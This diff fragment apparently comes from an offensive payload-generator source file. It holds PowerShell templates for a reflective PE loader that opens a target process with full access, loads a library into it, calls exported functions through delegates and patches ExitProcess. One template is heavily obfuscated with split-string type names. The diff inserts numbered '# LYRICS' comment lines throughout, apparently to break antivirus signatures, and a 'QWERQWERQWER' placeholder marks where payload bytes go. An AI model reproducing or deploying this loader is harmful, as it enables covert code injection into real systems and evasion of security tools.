+# LYRICS1074
+# LYRICS1075
             if (($VAR005 -ne $null) -and ($VAR005 -ne 0)) {
+# LYRICS1076
                 $VAR0161 = $VAR0042.FUN043.Invoke(0x001F0FFF, $false, $VAR005)
+# LYRICS1077
                 if ($VAR0161 -eq [IntPtr]::Zero) {
                     Throw "ERROR67: $VAR005"
                 }
-
+# LYRICS1078
             }
-
-
-            
+# LYRICS1079
+# LYRICS1080
+# LYRICS1081
             $VAR0263 = [IntPtr]::Zero
             if ($VAR0161 -eq [IntPtr]::Zero) {
+# LYRICS1082
                 $VAR0291 = FUN028 -VAR001 $VAR001 -VAR004 $VAR004 -VAR007 $VAR007
             }
             else {
+# LYRICS1083
                 $VAR0291 = FUN028 -VAR001 $VAR001 -VAR004 $VAR004 -VAR0161 $VAR0161 -VAR007 $VAR007
             }
             if ($VAR0291 -eq [IntPtr]::Zero) {
+# LYRICS1084
                 Throw "ERROR68"
             }
-
+# LYRICS1085
             $VAR0263 = $VAR0291[0]
+# LYRICS1086
             $VAR0292 = $VAR0291[1] 
-
-
-            
+# LYRICS1087
+# LYRICS1088
+# LYRICS1089
             $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
+# LYRICS1090
             if (($VAR0126.CONST037 -ieq "Library") -and ($VAR0161 -eq [IntPtr]::Zero)) {
-                
-                
-                
+# LYRICS1091
+# LYRICS1092
+# LYRICS1093
                 switch ($VAR003) {
                     'WideStr' {
-                        
+# LYRICS1094
+# LYRICS1095
                         [IntPtr]$VAR0293 = FUN027 -VAR0263 $VAR0263 -FunctionName "WideStrFunc"
+# LYRICS1096
                         if ($VAR0293 -eq [IntPtr]::Zero) {
                             Throw "ERROR67"
                         }
                         $VAR0294 = FUN011 @() ([IntPtr])
+# LYRICS1097
                         $VAR0295 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0293, $VAR0294)
+# LYRICS1098
                         [IntPtr]$VAR0296 = $VAR0295.Invoke()
+# LYRICS1099
                         $VAR0297 = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($VAR0296)
                         Write-Output $VAR0297
                     }
-
+# LYRICS1100
                     'Str' {
-
+# LYRICS1101
                         [IntPtr]$VAR0298 = FUN027 -VAR0263 $VAR0263 -FunctionName "StringFunc"
+# LYRICS1102
                         if ($VAR0298 -eq [IntPtr]::Zero) {
                             Throw "ERROR68"
                         }
                         $VAR0299 = FUN011 @() ([IntPtr])
+# LYRICS1103
                         $VAR0300 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0298, $VAR0299)
+# LYRICS1104
                         [IntPtr]$VAR0296 = $VAR0300.Invoke()
+# LYRICS1105
                         $VAR0297 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0296)
+# LYRICS1106
                         Write-Output $VAR0297
                     }
-
+# LYRICS1107
                     'NoOutput' {
+# LYRICS1108
                         [IntPtr]$VAR0301 = FUN027 -VAR0263 $VAR0263 -FunctionName "VoidFunc"
                         if ($VAR0301 -eq [IntPtr]::Zero) {
+# LYRICS1109
                             Throw "ERROR69"
                         }
                         $VAR0302 = FUN011 @() ([Void])
+# LYRICS1110
                         $VAR0303 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0301, $VAR0302)
+# LYRICS1111
                         $VAR0303.Invoke() | Out-Null
                     }
                     'DefaultSettings' {
+# LYRICS1112
                         Write-Verbose "ERROR70"
                     }
                 }
-                
-                
-                
+# LYRICS1113
+# LYRICS1114
+# LYRICS1115
             }
-            
+# LYRICS1116
             elseif (($VAR0126.CONST037 -ieq "Library") -and ($VAR0161 -ne [IntPtr]::Zero)) {
+# LYRICS1117
                 $VAR0301 = FUN027 -VAR0263 $VAR0263 -FunctionName "VoidFunc"
+# LYRICS1118
                 if (($VAR0301 -eq $null) -or ($VAR0301 -eq [IntPtr]::Zero)) {
+# LYRICS1119
                     Throw "ERROR71"
                 }
-
+# LYRICS1120
                 $VAR0301 = FUN004 $VAR0301 $VAR0263
+# LYRICS1121
                 $VAR0301 = FUN005 $VAR0301 $VAR0292
-
-                
+# LYRICS1122
+# LYRICS1123
+# LYRICS1124
                 $Null = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0301 -VAR0042 $VAR0042
             }
-
-            
-            
+# LYRICS1125
+# LYRICS1126
+# LYRICS1127
             if ($VAR0161 -eq [IntPtr]::Zero -and $VAR0126.CONST037 -ieq "Library") {
+# LYRICS1128
                 FUN029 -VAR0263 $VAR0263
             }
             else {
-                
+# LYRICS1129
+# LYRICS1130
                 $Success = $VAR0042.FUN038.Invoke($VAR0263, [UInt64]0, $VAR0041.CONST025)
-                
+# LYRICS1131
             }
-
+# LYRICS1132
         }
-
+# LYRICS1133
         FUN030
     }
-
-    
+# LYRICS1134
+# LYRICS1135
     Function FUN030 {
-        
-
-
+# LYRICS1136
+# LYRICS1137
+# LYRICS1138
         if (-not $VAR008) {
-            
-            
+# LYRICS1139
+# LYRICS1140
             $VAR001[0] = 0
+# LYRICS1141
             $VAR001[1] = 0
         }
-
-        
+# LYRICS1142
+# LYRICS1143
         if ($VAR004 -ne $null -and $VAR004 -ne '') {
+# LYRICS1144
             $VAR004 = "VAR0305 $VAR004"
         }
         else {
             $VAR004 = "VAR0305"
         }
-
+# LYRICS1145
         if ($VAR002 -eq $null -or $VAR002 -imatch "^\s*$") {
+# LYRICS1146
             Invoke-Command -ScriptBlock $VAR009 -ArgumentList @($VAR001, $VAR003, $VAR005, $VAR006, $VAR007, $VAR004)
+# LYRICS1147
         }
         else {
+# LYRICS1148
             Invoke-Command -ScriptBlock $VAR009 -ArgumentList @($VAR001, $VAR003, $VAR005, $VAR006, $VAR007, $VAR004) -VAR002 $VAR002
+# LYRICS1149
         }
     }
-
+# LYRICS1150
     FUN030
 }
 
 
+
 $Bytes = QWERQWERQWER
-FUN000 -VAR0001 $Bytes
+FUN000 -VAR001 $Bytes
 
 """
 
 
-let PowershellObfsTemplate * """
+let PowershellObfsTemplate * = """
 
  SET-varIABle  ("7ov"+"ix") (  [tyPe]("{6}{7}{1}{9}{3}{0}{10}{5}{8}{2}{4}"-F 'IcES','.IN','u','opSeRV','tE','al','sYsTEm.ru','nTiME','ASAttriB','Ter','.MARsH')  )  ;   $dtwM  = [tYPe]("{8}{3}{4}{2}{5}{1}{0}{6}{7}"-f 'Ic','oPSERV','IME.InT','ysTE','M.RuNt','ER','Es.uNmAn','AGeDTypE','s') ;  sv  ('T'+'Kd9')  ([tyPe]("{0}{1}" -F'InT','32'));   $WmbNg=[tyPe]("{1}{0}" -f'ol','bO') ;  seT  ('5T'+'7l') ([TyPE]("{1}{0}{2}"-F'N','Ui','T32')  );  $ns87 = [TYpe]("{2}{1}{0}"-F'r','eRTe','BiTConv'); $sw0  =  [typE]("{7}{8}{0}{10}{4}{3}{6}{5}{2}{9}{1}" -f 't','CcesS','U','flECTIon.em','E','MblyB','it.aSse','S','yS','IlDEra','EM.R') ;   Set-ITEM  ('VAr'+'IABle:j1'+'F'+'Vc')  ([TyPe]("{1}{6}{3}{5}{0}{4}{2}" -f'On.calLIN','S','ENTIoNS','teM.REfle','GCONv','cti','ys') ) ; $vbU= [tyPe]("{2}{0}{3}{1}"-f 'dO','n','aPP','MaI') ;set-ITem ('VAr'+'IaBl'+'e:Z5gH'+'r')  (  [type]("{2}{0}{1}"-f 'VIrOnMEN','T','EN')  )  ;  $oi4 = [typE]("{2}{0}{1}" -F 'inTpt','r','U');  $3x78  = [tyPe]("{1}{0}"-f'h','mat')  ;   $rt8 =[tYpe]("{1}{10}{3}{5}{8}{9}{4}{6}{2}{0}{7}" -F'eS','S','iC','eM','.iNTero','.RU','pSERV','.MaRSHaL','Nt','Ime','YSt');   sV  ('Lxq'+'4') ([TYPe]("{1}{0}{2}"-f 't','INtp','R')); function F`U`N000 {
 
@@ -3394,7 +3932,7 @@ let PowershellObfsTemplate * """
                     }
                 }
                 else {
-                    Throw ('ERROR06:'+' '+"$VAR0148")
+                    Throw ('ERROR006:'+' '+"$VAR0148")
                 }
             }
 
@@ -3413,7 +3951,7 @@ let PowershellObfsTemplate * """
               ( gci  ('V'+'aRIaBL'+'e:rT8')).ValUe::STruCTuREtOpTR($VAR0147, $VAR0146, $true)
 
             $VAR0144 = $VAR0042.FUN051.iNVoKe($VAR0142, $false, $VAR0146, $VAR0145,  $LXq4::ZEro,   ( Gi ('vaR'+'I'+'AbLE'+':l'+'XQ4') ).vALuE::zerO)
-            $VAR0148 =   ( vaRiAblE  ("Rt"+"8")  -Va)::GETLastwIn32ERROR() 
+            $VAR0148 =   ( vaRiAblE  ("Rt"+"8")  -Va)::GETLastwIn32ERROR0() 
             if (($VAR0144 -eq $false) -or ($VAR0148 -ne 0)) {
                 
             }
@@ -3558,7 +4096,7 @@ let PowershellObfsTemplate * """
             )
 
             if ($VAR0263 -eq $null -or $VAR0263 -eq  $lxq4::zeRO) {
-                throw ("{1}{0}"-f '6','ERROR6')
+                throw ("{1}{0}"-f '6','ERROR06')
             }
 
             $VAR0126 = New-Object ('S'+'ys'+'te'+'m.Object')
@@ -3622,7 +4160,7 @@ let PowershellObfsTemplate * """
                 Throw ("{0}{1}{2}" -f'ER','ROR1','0')
             }
             if ($VAR0165 -ne $VAR0167) {
-                Throw ("{1}{0}"-f '1','ERROR1')
+                Throw ("{1}{0}"-f '1','ERROR01')
             }
 
             $VAR0168 = $VAR0042.fuN041.INVOKE($VAR0302)
@@ -3814,7 +4352,7 @@ let PowershellObfsTemplate * """
             [UIntPtr]$VAR0167 =   $oI4::ZerO
             $Success = $VAR0042.FUN045.InVokE($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
             if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
-                Throw ("{1}{0}" -f '22','ERROR')
+                Throw ("{1}{0}" -f '22','ERROR0')
             }
 
             $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
@@ -4048,7 +4586,7 @@ let PowershellObfsTemplate * """
                     }
 
                     if (($VAR0213 -eq $null) -or ($VAR0213 -eq  (get-vaRiABle ('L'+'xQ4')  -vALueO)::zero)) {
-                        throw ('ERROR28'+':'+' '+"$VAR0164")
+                        throw ('ERROR028'+':'+' '+"$VAR0164")
                     }
 
                     
@@ -4087,7 +4625,7 @@ let PowershellObfsTemplate * """
 
                         if ($VAR0218 -eq $null -or $VAR0218 -eq   (  gEt-vARIAbLe ('LxQ'+'4')  ).ValUE::ZeRo) {
                             if ($VAR0185) {
-                                Throw ('ERROR'+'30'+': '+"$VAR0217 "+"$VAR0164")
+                                Throw ('ERROR0'+'30'+': '+"$VAR0217 "+"$VAR0164")
                             }
                             else {
                                 Throw ('ER'+'ROR'+'3'+'1: '+"$VAR0220 "+"$VAR0164")
@@ -4252,7 +4790,7 @@ let PowershellObfsTemplate * """
             [IntPtr]$VAR0234 = $VAR0042.FUN036.iNVokE($VAR0230, ("{1}{3}{0}{2}" -f 'a','GetCo','ndLineW','mm'))
     
             if ($VAR0233 -eq  (  iTeM ('vaRiABl'+'e'+':'+'LXq4') ).vaLUe::ZErO -or $VAR0234 -eq  ( vaRiaBLE ("l"+"xQ4")).VALue::zeRo) {
-                throw "ERROR36: $(FUN008 $VAR0233). ERROR37: $(FUN008 $VAR0234) "
+                throw "ERROR036: $(FUN008 $VAR0233). ERROR037: $(FUN008 $VAR0234) "
             }
     
             
@@ -4363,7 +4901,7 @@ let PowershellObfsTemplate * """
             
             [IntPtr]$VAR0253 = $VAR0042.fun041.INvOkE(("{2}{1}{0}{3}" -f 'e.dl','score','m','l'))
             if ($VAR0253 -eq   (get-childITem  ('V'+'arIa'+'Ble:Lxq4')  ).ValUe::ZeRo) {
-                throw ("{1}{0}" -f '4','ERROR4')
+                throw ("{1}{0}" -f '4','ERROR04')
             }
             [IntPtr]$VAR0254 = $VAR0042.FUn036.INVokE($VAR0253, ("{0}{2}{4}{1}{3}"-f'C','xitProce','or','ss','E'))
             if ($VAR0254 -eq   (  dir  ('va'+'Ri'+'aBle:l'+'Xq4')).valUE::ZERo) {
@@ -4550,7 +5088,7 @@ let PowershellObfsTemplate * """
                 $VAR0168 = $VAR0042.fUN041.InVOke($VAR0302)
                 $VAR0144 = $VAR0042.FUn036.INVOKE($VAR0168, ("{3}{0}{2}{1}" -f '64Proce','s','s','IsWow'))
                 if ($VAR0144 -eq  $lxq4::ZeRo) {
-                    Throw ("{1}{0}"-f '52','ERROR')
+                    Throw ("{1}{0}"-f '52','ERROR0')
                 }
 
                 [Bool]$VAR0275 = $false
@@ -4718,7 +5256,7 @@ let PowershellObfsTemplate * """
                     $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
                     $VAR0144 = $VAR0042.Fun044.iNvOKE($VAR0179, 20000)
                     if ($VAR0144 -ne 0) {
-                        Throw ("{0}{1}" -f'ERROR6','2')
+                        Throw ("{0}{1}" -f'ERROR06','2')
                     }
 
                     $VAR0042.FUn039.invoKE($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.COnSt025) | Out-Null
@@ -4859,7 +5397,7 @@ let PowershellObfsTemplate * """
                 $VAR0291 = FUN028 -VAR001 $VAR001 -VAR004 $VAR004 -VAR0161 $VAR0161 -VAR007 $VAR007
             }
             if ($VAR0291 -eq  (  item ('VA'+'rIa'+'BLe:LXq4')  ).vaLUe::ZEro) {
-                Throw ("{0}{1}"-f'ERROR','68')
+                Throw ("{0}{1}"-f'ERROR0','68')
             }
 
             $VAR0263 = $VAR0291[0]
@@ -4909,7 +5447,7 @@ let PowershellObfsTemplate * """
                         $VAR0303.iNvOkE() | Out-Null
                     }
                     ("{3}{1}{4}{0}{2}"-f 'ing','Set','s','Default','t') {
-                        Write-Verbose ("{2}{1}{0}" -f'0','7','ERROR')
+                        Write-Verbose ("{2}{1}{0}" -f'0','7','ERROR0')
                     }
                 }
                 
@@ -4978,7 +5516,7 @@ let PowershellObfsTemplate * """
 }
 
 $Bytes = QWERQWERQWER
-FUN000 -VAR0001 $Bytes
+FUN000 -VAR001 $Bytes
 
 
 """
